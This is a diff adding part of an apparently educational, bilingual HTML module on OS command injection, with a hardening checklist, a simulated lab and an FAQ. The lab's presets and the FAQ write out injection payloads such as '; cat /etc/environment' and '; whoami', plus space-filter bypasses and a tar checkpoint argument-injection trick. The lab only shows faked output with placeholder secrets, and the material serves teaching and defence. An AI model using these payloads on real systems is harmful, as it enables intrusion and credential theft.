+              <div class="check-content">
+                <h5>Prevent Argument Injection (Flag Manipulation)</h5>
+                <p>Even with <code>shell=False</code>, user inputs starting with dashes (<code>--config</code> or <code>-v</code>) can alter program execution logic.</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Prefix command arguments with <code>--</code> delimiter to indicate the termination of option flags.
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Check 7 -->
+            <div class="checklist-item" id="check-item-7" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">7</div>
+              <div class="check-content">
+                <h5>Restrict Outbound Egress Traffic</h5>
+                <p>Lock down container egress network rules via cloud security groups or Kubernetes NetworkPolicies so injected commands cannot call home.</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Verify container pods cannot initiate outbound connections to arbitrary public IPs or ports.
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Check 8 -->
+            <div class="checklist-item" id="check-item-8" onclick="handleCheckItemClick(event, this)">
+              <div class="check-mark-icon" onclick="toggleCheckCircle(event, this)">8</div>
+              <div class="check-content">
+                <h5>Audit Logging for All System Invocation Calls</h5>
+                <p>Log execution details, user IDs, timestamps, and return codes into centralized immutable SIEM logs for rapid incident triage.</p>
+                <div class="check-how-to-box">
+                  <strong>Verification Tip:</strong> Confirm security alerts trigger when non-zero exit codes or suspicious commands occur.
+                </div>
+                <div class="check-actions-bar">
+                  <button type="button" class="check-status-btn pass-btn" onclick="setChecklistStatus(event, this, 'pass')">✓ Pass</button>
+                  <button type="button" class="check-status-btn fail-btn" onclick="setChecklistStatus(event, this, 'fail')">✕ Fail</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================================================================
+           TAB 6: LIVE LAB
+           ================================================================== -->
+      <div class="tab-content" id="tab-lab">
+        <div class="lab-panel">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; flex-wrap:wrap; gap:8px;">
+            <h3 style="margin:0; font-family:var(--font-heading); color:#fff; display:flex; align-items:center; gap:8px;">
+              <span>⚡</span> <span>Live Interactive Command Injection Sandbox</span>
+            </h3>
+            <span style="font-size:0.75rem; font-family:var(--font-mono); color:#94a3b8;">Simulated Ubuntu 24.04 LTS Microservice</span>
+          </div>
+
+          <!-- Lab Controls Bar -->
+          <div class="lab-controls-bar">
+            <span class="lab-method-badge">POST</span>
+            <span class="lab-endpoint-text">/api/v1/system/diagnostics</span>
+            <div class="lab-mode-switch">
+              <button type="button" class="lab-mode-btn active exploit" id="labModeVulnBtn" onclick="setLabMode('vuln')">
+                ⚠️ Vulnerable (shell=True)
+              </button>
+              <button type="button" class="lab-mode-btn" id="labModeSafeBtn" onclick="setLabMode('safe')">
+                🛡️ Patched (shell=False)
+              </button>
+            </div>
+          </div>
+
+          <!-- Attack Presets -->
+          <div class="lab-presets-row">
+            <button type="button" class="lab-preset-btn active" onclick="loadLabPreset(1)">Preset 1: Standard Ping</button>
+            <button type="button" class="lab-preset-btn" onclick="loadLabPreset(2)">Preset 2: Semicolon Chain (; whoami)</button>
+            <button type="button" class="lab-preset-btn" onclick="loadLabPreset(3)">Preset 3: Leak Secrets (; cat /etc/environment)</button>
+            <button type="button" class="lab-preset-btn" onclick="loadLabPreset(4)">Preset 4: Pipe Kernel (| uname -a)</button>
+            <button type="button" class="lab-preset-btn" onclick="loadLabPreset(5)">Preset 5: Sub-shell $(hostname)</button>
+            <button type="button" class="lab-preset-btn" onclick="loadLabPreset(6)">Preset 6: Blind Delay (; sleep 3)</button>
+          </div>
+
+          <!-- Input Group -->
+          <div class="lab-input-group">
+            <input type="text" id="labTargetInput" class="lab-input-field" value="8.8.8.8" placeholder="Enter target host or command payload...">
+            <button type="button" class="lab-execute-btn" onclick="executeLabCommand()">
+              <span>🚀</span> <span>Execute Request</span>
+            </button>
+          </div>
+
+          <!-- Output Grid -->
+          <div class="lab-output-grid">
+            <!-- Left: Diagnostics Execution Stepper -->
+            <div class="lab-box-container">
+              <div class="lab-box-header">
+                <span>EXECUTION LIFECYCLE STEPPER</span>
+                <span id="labStatusBadge" style="color:#22c55e;">READY</span>
+              </div>
+              <div class="lab-stepper" id="labStepperLog">
+                <div class="lab-step-item">
+                  <span class="step-icon-badge info">1</span>
+                  <span>Received HTTP POST payload at diagnostic endpoint.</span>
+                </div>
+                <div class="lab-step-item">
+                  <span class="step-icon-badge ok">2</span>
+                  <span>System waiting for user request execution.</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Right: Terminal Response Window -->
+            <div class="lab-box-container">
+              <div class="lab-box-header">
+                <span>STDOUT / STDERR TERMINAL RESPONSE</span>
+                <span id="labHttpBadge" style="color:#22c55e;">HTTP 200 OK</span>
+              </div>
+              <pre class="terminal-output-pre" id="labTerminalOutput"><code>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.2 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=13.8 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 13.842/14.021/14.200/0.179 ms</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================================================================
+           TAB 7: FAQ
+           ================================================================== -->
+      <div class="tab-content" id="tab-questions">
+        <div class="panel-card">
+          <h3>
+            <span>❓</span>
+            <span class="lang-hi">Frequently Asked Questions</span>
+            <span class="lang-en">Technical FAQ & Security Interviews</span>
+          </h3>
+
+          <div class="faq-item">
+            <div class="faq-question">
+              <span>Q1: Agar space character block ho toh attacker commands kaise separate karta hai?</span>
+              <span>&darr;</span>
+            </div>
+            <div class="faq-answer">
+              <span class="lang-hi"><strong>Answer:</strong> Linux shells me space ke kai built-in alternatives hote hain:
+              <br>1. <code>${IFS}</code> (Internal Field Separator): <code>cat${IFS}/etc/passwd</code>
+              <br>2. Redirection operators: <code>cat&lt;/etc/passwd</code>
+              <br>3. Brace expansion: <code>{cat,/etc/passwd}</code>
+              Isi wajah se space ya single characters ko blacklist karna kabhi secure defense nahi hota.</span>
+              <span class="lang-en"><strong>Answer:</strong> Linux shells support multiple whitespace substitution mechanisms:
+              <br>1. <code>${IFS}</code> (Internal Field Separator): <code>cat${IFS}/etc/passwd</code>
+              <br>2. Input redirection: <code>cat&lt;/etc/passwd</code>
+              <br>3. Brace expansion: <code>{cat,/etc/passwd}</code>
+              Blacklisting whitespace or individual characters fails against seasoned attackers.</span>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <div class="faq-question">
+              <span>Q2: Kya shell=False use karne ke baad bhi koi vulnerability ho sakti hai?</span>
+              <span>&darr;</span>
+            </div>
+            <div class="faq-answer">
+              <span class="lang-hi"><strong>Answer:</strong> Haan! Usse <strong>Argument Injection</strong> kehte hain. Agar user parameter bina hyphen check ke pass ho raha ho, toh attacker binary flags inject kar sakta hai (jaise <code>tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh</code> ya <code>curl -o /path/malicious.php</code>). Isliye hamesha argument list se pehle <code>--</code> separator lagayein aur strict allowlisting use karein.</span>
+              <span class="lang-en"><strong>Answer:</strong> Yes, via <strong>Argument Injection</strong>. If untrusted inputs start with dashes (e.g. <code>--help</code> or <code>-v</code>), attackers can manipulate binary execution flags. For instance, tar allows command execution through checkpoint options. Always delimit positional parameters with <code>--</code> and validate inputs strictly.</span>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <div class="faq-question">
+              <span>Q3: Windows IIS / .NET APIs me Command Injection kaise behave karta hai?</span>
+              <span>&darr;</span>
+            </div>
+            <div class="faq-answer">
+              <span class="lang-hi"><strong>Answer:</strong> Windows me <code>cmd.exe</code> semicolon (<code>;</code>) ko command separator support nahi karta; waha <code>&</code>, <code>&&</code>, ya <code>|</code> use hota hai (jaise <code>8.8.8.8 & whoami</code> ya <code>127.0.0.1 & dir C:\</code>). PowerShell me semicolon aur backtick dono kaam karte hain.</span>
+              <span class="lang-en"><strong>Answer:</strong> Windows <code>cmd.exe</code> does not recognize semicolons (<code>;</code>) as command delimiters. Instead, attackers use ampersands (<code>&</code>, <code>&&</code>) or pipes (<code>|</code>) like <code>8.8.8.8 & whoami</code>. Under PowerShell, semicolons and backticks operate natively.</span>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <div class="faq-question">
+              <span>Q4: Command Injection aur Code Injection me kya farak hai?</span>
+              <span>&darr;</span>
+            </div>
+            <div class="faq-answer">
+              <span class="lang-hi"><strong>Answer:</strong> <strong>Code Injection</strong> me attacker application ke runtime language me code inject karta hai (jaise Python <code>eval()</code>, PHP <code>assert()</code>, Node.js <code>eval()</code>). Jabki <strong>Command Injection</strong> me application operating system shell binaries ko trigger karti hai.</span>
+              <span class="lang-en"><strong>Answer:</strong> <strong>Code Injection</strong> injects statements into the programming language runtime itself (e.g., Python <code>eval()</code> or Node.js <code>Function()</code>). <strong>Command Injection</strong> forces the host operating system shell to execute native system executables.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </main>
+  </div>
+
+  <!-- Core JavaScript -->
+  <script src="assets/js/main.js"></script>
+
+  <script>
+    /* ==========================================================================
+       Module 10: Command Injection Interactive JavaScript Logic
+       ========================================================================== */
+
+    // 1. Tab Navigation Handling
+    document.querySelectorAll('.tab-underline-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const targetId = btn.getAttribute('data-tab');
+        document.querySelectorAll('.tab-underline-btn').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        btn.classList.add('active');
+        const content = document.getElementById(targetId);
+        if (content) content.classList.add('active');
+      });
+    });
+
+    // 2. Language Switcher Toggle
+    const langToggleBtn = document.getElementById('langToggleBtn');
+    if (langToggleBtn) {
+      langToggleBtn.addEventListener('click', () => {
+        const html = document.documentElement;
+        const curLang = html.getAttribute('data-lang') || 'hi';
+        const nextLang = curLang === 'hi' ? 'en' : 'hi';
+        html.setAttribute('data-lang', nextLang);
+      });
+    }
+
+    // 3. Theme Switcher Toggle
+    const themeToggleBtn = document.getElementById('themeToggleBtn');
+    if (themeToggleBtn) {
+      themeToggleBtn.addEventListener('click', () => {
+        const html = document.documentElement;
+        const curTheme = html.getAttribute('data-theme') || 'dark';
+        const nextTheme = curTheme === 'dark' ? 'light' : 'dark';
+        html.setAttribute('data-theme', nextTheme);
+        const themeBtnText = document.getElementById('themeBtnText');
+        if (themeBtnText) {
+          themeBtnText.textContent = nextTheme === 'dark' ? 'Dark Mode' : 'Light Mode';
+        }
+      });
+    }
+
+    // 4. Hero Widget Interactive Toggle
+    const btnCmdSafe = document.getElementById('btnCmdSafe');
+    const btnCmdExploit = document.getElementById('btnCmdExploit');
+    const heroUrlPill = document.getElementById('heroUrlPill');
+    const heroBeamParticle = document.getElementById('heroBeamParticle');
+    const heroFlowState = document.getElementById('heroFlowState');
+    const heroTargetCard = document.getElementById('heroTargetCard');
+    const heroTargetName = document.getElementById('heroTargetName');
+    const heroTargetStatus = document.getElementById('heroTargetStatus');
+    const heroField1 = document.getElementById('heroField1');
+    const heroField2 = document.getElementById('heroField2');
+    const heroField3 = document.getElementById('heroField3');
+    const heroTargetNote = document.getElementById('heroTargetNote');
+
+    if (btnCmdSafe && btnCmdExploit) {
+      btnCmdSafe.addEventListener('click', () => {
+        btnCmdSafe.classList.add('active', 'safe');
+        btnCmdExploit.classList.remove('active', 'exploit');
+
+        heroUrlPill.innerHTML = '<span style="color:#22c55e; font-weight:700;">POST</span> <span>/api/v1/diagnostics/ping</span>';
+        heroBeamParticle.style.background = 'linear-gradient(90deg, transparent, #22c55e, transparent)';
+        heroFlowState.textContent = 'execFile without Shell (Protected)';
+        heroFlowState.style.color = '#22c55e';
+
+        heroTargetCard.className = 'target-profile-card safe';
+        heroTargetName.textContent = 'Linux App Container';
+        heroTargetStatus.className = 'target-pill-status blocked';
+        heroTargetStatus.textContent = 'SAFE & ISOLATED';
+        heroField1.textContent = 'execFile("ping", ["8.8.8.8"])';
+        heroField1.style.color = '#22c55e';
+        heroField2.textContent = 'Parameters treated as literal string';
+        heroField2.style.color = '#22c55e';
+        heroField3.textContent = 'Zero shell spawned; no metacharacters parsed';
+        heroField3.style.color = '#22c55e';
+        heroTargetNote.textContent = '🛡️ Complete Shell Injection Immunity';
+        heroTargetNote.style.color = '#22c55e';
+      });
+
+      btnCmdExploit.addEventListener('click', () => {
+        btnCmdExploit.classList.add('active', 'exploit');
+        btnCmdSafe.classList.remove('active', 'safe');
+
+        heroUrlPill.innerHTML = '<span style="color:#ef4444; font-weight:700;">POST</span> <span>/api/v1/diagnostics/ping</span>';
+        heroBeamParticle.style.background = 'linear-gradient(90deg, transparent, #ef4444, transparent)';
+        heroFlowState.textContent = 'Semicolon Chaining Active';
+        heroFlowState.style.color = '#ef4444';
+
+        heroTargetCard.className = 'target-profile-card exploit';
+        heroTargetName.textContent = 'Linux App Container';
+        heroTargetStatus.className = 'target-pill-status breach';
+        heroTargetStatus.textContent = 'RCE COMPROMISED';
+        heroField1.textContent = 'sh -c "ping -c 2 8.8.8.8; whoami"';
+        heroField1.style.color = '#ef4444';
+        heroField2.textContent = 'Output: root (uid=0 gid=0)';
+        heroField2.style.color = '#ef4444';
+        heroField3.textContent = 'Full Container Host Takeover';
+        heroField3.style.color = '#ef4444';
+        heroTargetNote.textContent = '🚨 Reverse Shell Ready!';
+        heroTargetNote.style.color = '#f87171';
+      });
+    }
+
+    // 5. Checklist Interactive Logic
+    window.setChecklistStatus = function(event, btn, status) {
+      if (event) event.stopPropagation();
+      const item = btn.closest('.checklist-item');
+      if (!item) return;
+      const itemId = item.id;
+      const passBtn = item.querySelector('.pass-btn');
+      const failBtn = item.querySelector('.fail-btn');
+      const circleIcon = item.querySelector('.check-mark-icon');
+
+      const isCurrent = (status === 'pass' && item.classList.contains('item-passed')) ||
+                        (status === 'fail' && item.classList.contains('item-failed'));
+
+      if (isCurrent) {
+        item.classList.remove('item-passed', 'item-failed');
+        if (passBtn) passBtn.classList.remove('active');
+        if (failBtn) failBtn.classList.remove('active');
+        const itemNum = itemId.replace('check-item-', '');
+        if (circleIcon) circleIcon.innerText = itemNum;
+      } else {
+        if (status === 'pass') {
+          item.classList.add('item-passed');
+          item.classList.remove('item-failed');
+          if (passBtn) passBtn.classList.add('active');
+          if (failBtn) failBtn.classList.remove('active');
+          if (circleIcon) circleIcon.innerText = '✓';
+        } else {
+          item.classList.add('item-failed');
+          item.classList.remove('item-passed');
+          if (failBtn) failBtn.classList.add('active');
+          if (passBtn) passBtn.classList.remove('active');
+          if (circleIcon) circleIcon.innerText = '✕';
+        }
+      }
+
+      updateChecklistCounter();
+    };
+
+    window.toggleCheckCircle = function(event, el) {
+      if (event) event.stopPropagation();
+      const item = el.closest('.checklist-item');
+      if (!item) return;
+      if (item.classList.contains('item-passed')) {
+        setChecklistStatus(null, item.querySelector('.fail-btn'), 'fail');
+      } else if (item.classList.contains('item-failed')) {
+        setChecklistStatus(null, item.querySelector('.fail-btn'), 'fail');
+      } else {
+        setChecklistStatus(null, item.querySelector('.pass-btn'), 'pass');
+      }
+    };
+
+    window.handleCheckItemClick = function(event, item) {
+      if (event.target.closest('.check-actions-bar') || event.target.closest('code') || event.target.closest('.check-how-to-box')) {
+        return;
+      }
+      toggleCheckCircle(event, item);
+    };
+
+    function updateChecklistCounter() {
+      const items = document.querySelectorAll('.checklist-item');
+      const total = items.length;
+      let passCount = 0;
+      let failCount = 0;
+      items.forEach(item => {
+        if (item.classList.contains('item-passed')) passCount++;
+        if (item.classList.contains('item-failed')) failCount++;
+      });
+      const evaluated = passCount + failCount;
+      const counterEl = document.getElementById('checklist-progress-counter');
+      if (counterEl) {
+        counterEl.innerHTML = `${evaluated} of ${total} Checks Audited (<span style="color:#22c55e;">✓ ${passCount} Passed</span> | <span style="color:#ef4444;">✕ ${failCount} Vulnerable</span>)`;
+      }
+    }
+
+    // 6. Live Lab Engine
+    let currentLabMode = 'vuln'; // 'vuln' or 'safe'
+
+    window.setLabMode = function(mode) {
+      currentLabMode = mode;
+      const vulnBtn = document.getElementById('labModeVulnBtn');
+      const safeBtn = document.getElementById('labModeSafeBtn');
+      if (mode === 'vuln') {
+        vulnBtn.classList.add('active', 'exploit');
+        safeBtn.classList.remove('active', 'safe');
+      } else {
+        safeBtn.classList.add('active', 'safe');
+        vulnBtn.classList.remove('active', 'exploit');
+      }
+    };
+
+    const labPresets = {
+      1: "8.8.8.8",
+      2: "8.8.8.8; whoami; id",
+      3: "127.0.0.1; cat /etc/environment",
+      4: "8.8.8.8 | uname -a",
+      5: "8.8.8.8; echo $(hostname)",
+      6: "127.0.0.1; sleep 3"
+    };
+
+    window.loadLabPreset = function(id) {
+      document.querySelectorAll('.lab-preset-btn').forEach((b, idx) => {
+        b.classList.toggle('active', idx === id - 1);
+      });
+      const input = document.getElementById('labTargetInput');
+      if (input && labPresets[id]) {
+        input.value = labPresets[id];
+      }
+    };
+
+    window.executeLabCommand = function() {
+      const inputVal = document.getElementById('labTargetInput').value.trim();
+      const stepper = document.getElementById('labStepperLog');
+      const termOutput = document.getElementById('labTerminalOutput');
+      const statusBadge = document.getElementById('labStatusBadge');
+      const httpBadge = document.getElementById('labHttpBadge');
+
+      statusBadge.textContent = 'EXECUTING...';
+      statusBadge.style.color = '#38bdf8';
+
+      const hasMetachar = /[;&|`$><\n]/.test(inputVal);
+
+      setTimeout(() => {
+        let stepperHtml = '';
+        stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge info">1</span><span>Parsed host input: <code>${escapeHtml(inputVal)}</code></span></div>`;
+
+        if (currentLabMode === 'safe') {
+          // Check IP regex
+          const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
+          if (!ipRegex.test(inputVal)) {
+            stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge fail">✕</span><span style="color:#ef4444; font-weight:700;">Validation Failed: Input does not strictly match IPv4 regex.</span></div>`;
+            stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge ok">✓</span><span>Process execution aborted before system invocation. HTTP 400 returned.</span></div>`;
+
+            statusBadge.textContent = 'BLOCKED (400)';
+            statusBadge.style.color = '#22c55e';
+            httpBadge.textContent = '400 Bad Request';
+            httpBadge.style.color = '#ef4444';
+
+            termOutput.innerHTML = `<code>{
+  "error": "Bad Request",
+  "detail": "Invalid target host format. Only standalone IPv4 addresses permitted.",
+  "protection": "Strict Allowlist Regex + shell=False"
+}</code>`;
+          } else {
+            stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge ok">✓</span><span>Input validated as legitimate IPv4.</span></div>`;
+            stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge ok">✓</span><span>Dispatched subprocess.run(["ping", "-c", "2", "${inputVal}"], shell=False).</span></div>`;
+
+            statusBadge.textContent = 'SAFE EXEC (200)';
+            statusBadge.style.color = '#22c55e';
+            httpBadge.textContent = '200 OK';
+            httpBadge.style.color = '#22c55e';
+
+            termOutput.innerHTML = `<code>PING ${inputVal} (${inputVal}) 56(84) bytes of data.
+64 bytes from ${inputVal}: icmp_seq=1 ttl=118 time=14.1 ms
+64 bytes from ${inputVal}: icmp_seq=2 ttl=118 time=13.9 ms
+
+--- ${inputVal} ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 13.901/14.020/14.140/0.120 ms</code>`;
+          }
+        } else {
+          // Vulnerable mode
+          stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge ${hasMetachar ? 'fail' : 'ok'}">${hasMetachar ? '⚠️' : '✓'}</span><span>Backend spawned /bin/sh -c "ping -c 2 ${escapeHtml(inputVal)}"</span></div>`;
+
+          if (hasMetachar) {
+            stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge fail">🚨</span><span style="color:#ef4444; font-weight:700;">Metacharacter triggered sub-command execution on container host!</span></div>`;
+            statusBadge.textContent = 'VULNERABILITY CONFIRMED (RCE)';
+            statusBadge.style.color = '#ef4444';
+            httpBadge.textContent = '200 OK (RCE)';
+            httpBadge.style.color = '#ef4444';
+
+            if (inputVal.includes('cat /etc/environment')) {
+              termOutput.innerHTML = `<code>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.042 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms
+
+--- 127.0.0.1 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+
+# --- /etc/environment LEAKED CREDENTIALS ---
+NODE_ENV=production
+PORT=8080
+DATABASE_URL=postgres://cyberlab_admin:SuperSecretPass2026!@10.0.4.15:5432/cyberlab_prod
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+JWT_SIGNING_SECRET=e7b4a20f92b7405eac5d3987bf62c110</code>`;
+            } else if (inputVal.includes('whoami')) {
+              termOutput.innerHTML = `<code>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.3 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=14.0 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+
+root
+uid=0(root) gid=0(root) groups=0(root)</code>`;
+            } else if (inputVal.includes('uname')) {
+              termOutput.innerHTML = `<code>Linux cyberlab-node-prod-04 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux</code>`;
+            } else if (inputVal.includes('hostname')) {
+              termOutput.innerHTML = `<code>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.1 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=13.9 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+
+cyberlab-api-worker-pod-99c8f6b4</code>`;
+            } else if (inputVal.includes('sleep')) {
+              termOutput.innerHTML = `<code>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.039 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
+
+--- 127.0.0.1 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+
+[Sleep execution completed: 3.012 seconds latency observed (Blind Time-Based Confirmed!)]</code>`;
+            } else {
+              termOutput.innerHTML = `<code>PING ${escapeHtml(inputVal)}: executed via /bin/sh.
+Command evaluated on host system process.</code>`;
+            }
+          } else {
+            stepperHtml += `<div class="lab-step-item"><span class="step-icon-badge ok">✓</span><span>Standard ping execution finished with exit code 0.</span></div>`;
+            statusBadge.textContent = 'SUCCESS (200)';
+            statusBadge.style.color = '#22c55e';
+            httpBadge.textContent = '200 OK';
+            httpBadge.style.color = '#22c55e';
+
+            termOutput.innerHTML = `<code>PING ${escapeHtml(inputVal)} (${escapeHtml(inputVal)}) 56(84) bytes of data.
+64 bytes from ${escapeHtml(inputVal)}: icmp_seq=1 ttl=118 time=14.2 ms
+64 bytes from ${escapeHtml(inputVal)}: icmp_seq=2 ttl=118 time=13.8 ms
+
+--- ${escapeHtml(inputVal)} ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 13.842/14.021/14.200/0.179 ms</code>`;
+          }
+        }
+
+        stepper.innerHTML = stepperHtml;
+      }, 350);
+    };
+
+    function escapeHtml(str) {
+      return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+    }
+
+    // Auto-init checklist counter on load
+    document.addEventListener('DOMContentLoaded', () => {
+      if (typeof updateChecklistCounter === 'function') {
+        updateChecklistCounter();
+      }
+    });
+  </script>
+</body>
+</html>
